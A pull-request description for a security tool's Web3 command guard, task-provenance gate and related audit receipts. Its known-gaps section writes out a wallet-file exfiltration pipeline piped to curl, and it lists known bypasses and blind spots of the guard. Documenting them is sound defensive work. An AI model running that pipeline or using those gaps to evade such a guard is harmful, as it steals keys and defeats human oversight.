# PR: add a Web3 and provenance-aware execution boundary

Branch `codex/web3-task-boundary`. This file is the PR description; copy it into
the pull request body when the PR is opened.

## Summary

This branch repairs current ThreatDB publication correctness, adds bounded file
and PDF dispatch with global output bounds, centralizes sensitive wallet and key
handling behind mandatory redaction, parses and guards state-changing Web3
commands, carries untrusted task provenance into a typed capability decision,
and enforces that decision only at tirith-owned transitions. It also adds
bounded, explicit audit and receipt surfaces for CI artifact flows, untrusted
projects, Chromium extension integrity, npm provenance, and point-in-time build
and deployment evidence.

**It does not add on-chain analysis, new live threat feeds, ThreatDB v3, an npm
artifact firewall, continuous or private browser forensics, reproducible builds,
or universal shell and MCP enforcement.** Each of those is stated as an explicit
non-goal below and in `docs/threat-model.md`.

No new GATE becomes active on an installation that does not configure it.
`task_gate` defaults to `off`, `web3_guard` defaults to no networks and no
signers with every action at `warn`, the seven policy templates mention neither
section, the preview MCP tool is absent from the default `tools/list`, and the
five new explicit commands never run implicitly.

The detection rules are a different matter and are NOT gated on configuration.
On an unconfigured installation `web3_state_changing_command` fires at MEDIUM
(action `warn`) for `cast send` against an endpoint, `forge script --broadcast`,
`solana program deploy`, and `anchor deploy`, which is a real new interruption
for Foundry, Solana, and Anchor users. `web3_signer_risk` reaches CRITICAL for
raw key and mnemonic material in argv, though the pre-existing
`private_key_exposed` rule already blocked those same commands, so that is a new
finding rather than a new refusal. Quieting the new warn requires a user or org
`severity_overrides`, since a repo-scoped one is neutralized as weakening. See
[docs/web3-task-rollout.md](web3-task-rollout.md#what-is-on-by-default).

## How to review this

It is one PR because the slices depend on each other, but it is 32 commits
because each one is separately reviewable and separately revertible. Review by
commit range:

| Range | Subject | Expertise | Approval question |
|---|---|---|---|
| C00-C01 | frozen base contracts, ThreatDB publication correctness | release, threat intelligence | can the existing stack publish safely? |
| C02-C03 | byte dispatch, output bounds, PDF analysis | parser, DoS, content security | is dispatch exclusive and is work bounded? |
| C04-C05 | sensitive assets, mandatory redaction, exfiltration | credential, DLP, privacy | can any secret escape, or benign data overfire? |
| C06, C10 | Web3 grammar, rule wiring, command card v2 | Foundry, Hardhat, Solana | are operation, signer, network, and card semantics correct? |
| C07 | `web3_guard` and `task_gate` policy | policy and trust boundary | can repo or caller state ever enlarge authority? |
| C08 | task envelope, provenance, capability decision | cryptography, provenance, privacy | are receipts content-bound, replay-safe, and non-secret? |
| C11 | task CLI and preview MCP tool | CLI and MCP compatibility | is the new surface bounded and additive? |
| C12, C14 | owned-transition enforcement, capsule preset | execution, runtime, sandbox | does denial precede every owned irreversible transition? |
| C13, C17 | npm grammar, identity facts, provenance receipt | npm, registry, supply chain | are identity and verification claims exact? |
| C15, C16, C18 | CI artifact flow, browser audit, build and deployment receipts | Actions security, browser privacy, build and SSRF | is each claim exactly as strong as its evidence? |
| C19-C20 | adversarial, fuzz, benchmark, docs, rollout | designated integrator, product and release | does the documentation match the code? |

C09, a shared signed evidence envelope, is **deferred by operator decision**.
The prepared candidate hard-depends on an audit key-lifecycle subsystem
(keyring generations, signing manifests, retirement and revocation windows,
lifecycle locking) that does not exist in this tree and that the C09 plan text
does not describe. Integrating it would have meant importing roughly eight
thousand unreviewed lines into the privacy-critical audit path. The four
receipts that needed an envelope define their own, modelled on the same field
names and discipline, so a revived generic envelope can absorb them by
substitution rather than growing a fifth copy.

## Intentional compatibility deltas

Every deliberate change to an existing contract, so a reviewer does not have to
find them.

| # | Delta | Why it is safe |
|---|---|---|
| 1 | **Command card gains `schema_version` and `web3`.** | Both are omitted from the JSON unless set, so a v1 card's signing bytes are byte-identical. A test pins the v1 payload to an exact literal rather than to a round-trip, because a round-trip would still pass if both sides changed together. A second test parses a card written before v2 existed, signs it, verifies it, and asserts neither key appears on re-serialization. |
| 2 | **A v1 command card can never approve a Web3 operation.** | It attests to a command string and says nothing about network, signer, or destination. `approves_web3` returns `V1CannotApproveWeb3`. This is a new refusal, not a changed acceptance: v1 cards keep doing exactly what they did. |
| 3 | **Policy gains `web3_guard` and `task_gate`.** | Both optional, both inert by default. A policy written before they existed loads and behaves identically, and tirith does not auto-write a schema-upgraded policy, so a binary rollback strands nobody. |
| 4 | **Three new Web3 rule IDs plus `workflow_artifact_poisoning`.** | Rule IDs are an additive surface by the documented compatibility contract. All four are registered in scoring as NOT threat-intel and in the output filter as NOT injection seeds. |
| 5 | **`workflow_run_trigger` can be downgraded from High to Medium.** | Only by the repository post-pass, and only for a consumer it had complete visibility into and proved no chain for. The post-pass lives in `scan::scan`, so it runs for every directory scan: `tirith scan`, the `tirith_scan_directory` MCP tool, and both MCP scan resources. Per-file analysis never runs it and keeps the original severity: `tirith check` on one workflow file, the `tirith_scan_file` MCP tool via `scan_single_file_guarded`, and the LSP. |
| 6 | **`tirith_check_task` exists but is not advertised.** | The default `tools/list` is unchanged and still pinned by its C00 contract test. The preview tool is refused by name without `TIRITH_MCP_PREVIEW=1`. |
| 7 | **Three new top-level commands (`task`, `capsule`, `attest`) and one new `pkg` subcommand.** | Additive. `every_command_is_categorized` and the help snapshots cover the new surface. |
| 8 | **New commands use their own exit codes, and `3` means `partial`.** | Per-command codes in this repository are deliberately distinct; `tirith check`'s ladder is unchanged. Every new command's `--help` states its own codes, and `docs/compatibility.md` now carries the table. |
| 9 | **The C00 capability-manifest freeze hash moves.** | Six entries added, zero removed, zero renamed, zero regrouped, no existing value changed, order and group order preserved, `manifest_version` unchanged. Verified by parsing and diffing both manifests entry by entry; the justification is written into `tests/fixtures/c00/contracts.toml` following the C13, C14, and C16 precedent. |
| 10 | **The C00 legacy-policy projection freeze moved earlier in the stack** (projection v2 to v3). | C04 bumped the security projection so every string is privacy-projected before it can enter a durable value or digest; v2 hashed raw free text. Diffed key by key: no key added or removed, no value changed except `projection_version`. |
| 11 | **A C04-era assertion that PowerShell `-InFile` must fail closed was corrected.** | C05 added first-class `-InFile` parsing, so the reviewed behaviour is now a confirmed source-to-sink flow. The stale test was corrected; the code was not relaxed. |
| 12 | **Two prompt-injection seeds were narrowed.** | `<<SYS>>` compiled to a pattern matching any HTML or XML tag, and a bare `system:` matched inside ordinary words and every Kubernetes RBAC principal. Both were live High false positives that dropped whole tool results. An operator's own `injection_seeds_custom` keeps the documented `<role>` placeholder behaviour. |
| 13 | **README rule and command counts corrected** (221 to 244 rules, 74 to 78 commands). | Both were already stale before this branch. Counted from `rule_explanations.toml` and from `tirith --help`. |
| 14 | **`docs/commands.md` gains a "Package firewall" section.** | That whole group was missing from the reference. Pre-existing omission, fixed here because `pkg attest-npm` needed a correct home. |

## Non-goals

Stated explicitly so nothing has to be inferred from silence. Each is also in
`docs/threat-model.md` and `docs/enforcement-coverage.md`.

- **No on-chain analysis.** No chain state read, no transaction simulated, no
  ENS resolved, no address or counterparty scored, no contract audited, no
  mempool watched, no on-chain incident attributed. An unrecognized RPC endpoint
  is reported as unclassified and says in so many words that this is not a claim
  the host is malicious.
- **No npm artifact firewall.** No npm tarball is downloaded, extracted,
  quarantined, hashed, or bound; there is no npm install transaction and no npm
  rollback. `NpmVerificationState::Verified` has no constructor in this branch
  and a unit test asserts it: npm signs with ECDSA P-256, this workspace carries
  only `ed25519-dalek`, and the Sigstore closure needs a newer Rust than the
  workspace MSRV. `corepack` is not modelled at all.
- **No browser forensics.** `tirith browser audit` reads extension source trees
  and exactly three install-class Preferences fields. It never reads cookies,
  history, saved passwords, Local Storage, IndexedDB, extension storage, wallet
  databases, or `Local State`, so it cannot see browsing data or the signed-in
  account. It never removes, quarantines, or watches anything, has no daemon,
  and attributes no infostealer. Firefox and XPI are refused by name.
- **No reproducible builds.** Tirith does not run the build, does not observe
  the compiler, and cannot say an output came from a source. Two receipts over
  the same source with different outputs are both valid. A deployment receipt
  proves only that the routes it fetched returned those bytes at that timestamp.
- **No universal enforcement.** Enforcement exists at nine tirith-owned
  transitions and in a shell hook that must be installed, interactive, and in a
  blocking mode. A non-interactive shell, a direct `exec`, a program linking
  `tirith-core` as a library, and an agent that never loaded the hook are not
  covered. `TIRITH=0` bypasses unless `allow_bypass_env: false`, and a root user
  bypasses trivially.
- **No new live feed and no new database format.** No Polkadot, MISP, PhishTank,
  ScamSniffer, or Chainabuse channel is activated, and no ThreatDB v3 asset
  exists to shadow v2. What the compiler gained is correctness on sources
  already in the workflow, the existing typosquat input path wired through, and
  a bounded pinned package-version snapshot fetched inside the same audited
  source transaction. All are attributed in `NOTICE`.
- **No unqualified address blocking.** No EVM, SS58, or Solana address
  populates a global unqualified block index.
- **No smart-contract auditing, transaction simulation, or wallet scoring.**

## Known gaps carried deliberately

These are shipped as gaps, not as silent absences. Each is documented where an
operator will meet it.

1. **Nested-shell exfiltration.** `bash -c "cat <wallet>" | curl -d @- <url>` is
   a confident allow. The nested body IS analyzed, so the same chain wholly
   inside or wholly outside `-c` is detected; what is missing is propagation of
   the inner body's read provenance into the outer pipeline. Related unprobed
   shapes: `xargs -a <file>`, `parallel -a <file>`, `while read` loops. Fixing
   it is a behaviour change and belongs to its own slice.
2. **`forge create` has no grammar arm.** It yields an Unknown operation with an
   `AmbiguousSubcommand` gap, and on the engine surfaces that gap is SILENT:
   `web3_gate::check` never reads the parse result's gaps, so the command
   returns a clean `allow` with no findings and exit 0. `tirith task check`
   reports it as `"complete": false`. Surfacing it on the engine surfaces is a
   behaviour change and belongs to its own slice.
3. **Task effect inference covers only the Web3 shell grammar,** so nearly every
   ordinary SHELL command reads as incomplete. `action_incomplete_analysis: block`
   under `mode: enforce` refuses those at the five boundaries that submit a shell
   envelope, and changes nothing at the four package and config-write boundaries,
   which always assess as complete. Documented in the module, in the threat
   model, in the cookbook, and pinned by a fixture.
4. **The browser baseline is signed but not anchored** in the audit hash chain,
   and **Chrome's `Secure Preferences` MAC is not verified.**
5. **The build, deployment, and npm receipts are not anchored** in the audit
   chain either, for the same reason: the chain's anchor constructor cannot
   accept an operator-chosen path.
6. **The capsule preset is enforceable on x86_64 Linux only,** and domain
   allow-listing is unavailable in every backend, so the preset is deny-all.
7. **A full disk locks a zsh OR fish shell out of every command.** A defect in
   shipped hook code that this work found rather than introduced: the zsh
   widgets and the fish hook both create a `mktemp` capture file before the
   binary runs and fail closed, and `TIRITH=0` is honoured inside the binary
   that is never reached. Bash degrades to preexec instead. Recovery is
   documented in `docs/troubleshooting.md`.
8. **One load-sensitive test remains flaky.**
   `session_warnings::tests::surfaced_correlation_not_re_emitted_while_source_events_live`
   performs 260 fsync-backed mutations against a 20-second window. It is
   pre-existing, last modified by C04, and already carries its own mitigation
   comment. Fixing it properly needs a time-injection seam in production code.
9. **Six `web3_guard` fields and the whole schema-2 Web3 command card are
   declared but unreachable.** `deny_destinations`, `require_command_card`,
   `command_card_key_ids`, `selector_aliases`, and the `web3_guard` copies of
   `action_incomplete_analysis` and `action_ambiguous_hardhat_production_run`
   are parsed, validated, and merged, but no rule reads them. `approves_web3`
   has no caller, and `command-card create` cannot author a Web3 card. Wiring
   either is a behaviour change and belongs to its own slice.
10. **Only `gateway_forward` records task-gate decisions.** `is_recordable()`
    has a single production caller, so the other eight owned boundaries write
    nothing in observe or enforce mode and cannot be measured by a burn-in.

## Verification

Per slice, throughout: workspace check with all targets and features, focused
suites for the changed seams, strict workspace Clippy, `cargo fmt --check`,
`git diff --check`, cross-compilation checks for `x86_64-pc-windows-gnu` and
`x86_64-unknown-linux-gnu`, dogfooding through the built binary, and three
independent adversarial review lenses followed by one fix pass.

The review loop found real defects AFTER the code was written and passing its
own tests, which is the argument for keeping it rather than deferring review to
a 223-file diff: a Solana base58 key reaching `Debug` and `Serialize` verbatim;
two grammar defects that turned a broadcasting `cast send` into a confident
gap-free "no chain write"; an omission-is-not-a-no-op policy bug that silently
overrode operator settings; a single recognized token vouching for an entire
command line so a key-exfiltration segment went unreported under a complete
verdict; categorical evidence blanked into uselessness by the shared
command-text scrubber; `tirith install url <URL>` reaching the identical
download-and-launch as `tirith run` with no gate; a config-write gate covering
two of five owned writes; and a hardlink-smuggling hole in the capsule copier.

Dogfooding found three things unit tests structurally could not, each because
the tests asserted on state BEFORE the boundary that mattered: a private wallet
path reaching the persistent audit log, the blanked evidence above, and a devnet
false positive.

A later independent audit of C00 through C18 verified every slice and found
eight further defects. Seven are fixed on this branch: authored finding prose
being mangled by the mandatory value redactor; `ConfigWrite` never inferring
`PolicyChange`, which made a `policy_change` denial unreachable; `foundry_signer`
having no environment fallback, so `ETH_PRIVATE_KEY=0x... cast send` carried no
signer in the Web3 facts; `xargs` promotion of a piped sensitive path list;
`find -exec` and `parallel :::` operand promotion; single-file compressors whose
path operand was eaten by a `head`/`tail` option table; and `openssl enc -out` /
`gpg -o` / `age -o` staged outputs carrying no lineage. The eighth is gap 1
above, deferred with its reproduction recorded rather than quietly dropped.

## Merge and release gates

Measured results for everything run on the branch tip are in
`docs/release-evidence-web3-task-boundary.md`. In short, these are closed with
numbers: the workspace suite (8,094 passed, 0 failed), the MSRV 1.83 job exactly
as CI runs it, stable clippy and fmt, Windows and Linux cross-compiles,
`cargo deny` (advisories, bans, licences, sources all ok), the Criterion budget
gate (23 of 23 inside budget), and fuzz smoke for all 12 registered targets
(zero crashes).

These remain open, belong to the release owner, and are NOT claimed here:

- pause and independently verify the disabled state of the scheduled ThreatDB
  workflow, run the shadow build and the `@solana/web3.js` boundary regression,
  then re-enable and monitor one deliberate run;
- retarget onto the post-predecessor-stack `main` tip and recompute the merge
  tree;
- a fresh review of any conflict resolution the retarget produces;
- the full CI matrix on the final tree. Every measurement above is from ONE
  macOS arm64 host, and several capabilities in this branch are Linux-only by
  construction, so their enforcing paths have never executed anywhere;
- binary-size review against the last released artifact. This branch records
  28.3 MiB on that host, but there is no prior figure in the repository to
  compare it against;
- release-owner sign-off on the merge window and the rollback playbook in
  `docs/web3-task-rollout.md`.

Do not squash before the security review and release window: the per-slice
commits are what make an emergency revert surgical.

## Documentation in this PR

| Document | What it covers |
|---|---|
| `docs/enforcement-coverage.md` | the per-capability ledger separating detection, preflight decision, execution enforcement, containment, attestation, and unsupported platform |
| `docs/security/web3-command-guard.md` | the Web3 grammar, the three rules, `web3_guard`, and command-card v2 bindings |
| `docs/task-envelope.md` | the envelope format, the capability decision, `task_gate`, and the preview MCP tool |
| `docs/untrusted-projects.md` | the operator workflow for a repository you did not write |
| `docs/ci-artifact-flow.md` | the cross-workflow artifact post-pass |
| `docs/browser-extension-audit.md` | the read-only extension audit and its privacy boundary |
| `docs/npm-provenance-receipt.md` | `pkg attest-npm` and exactly what it does not bind |
| `docs/attestation-receipts.md` | build and deployment receipts |
| `docs/web3-task-rollout.md` | staged enablement, promotion gates, rollback operators, and rollback triggers |
| `docs/research/issuetrojanbench.md` | why nothing was vendored, and what the synthetic corpus asserts instead |
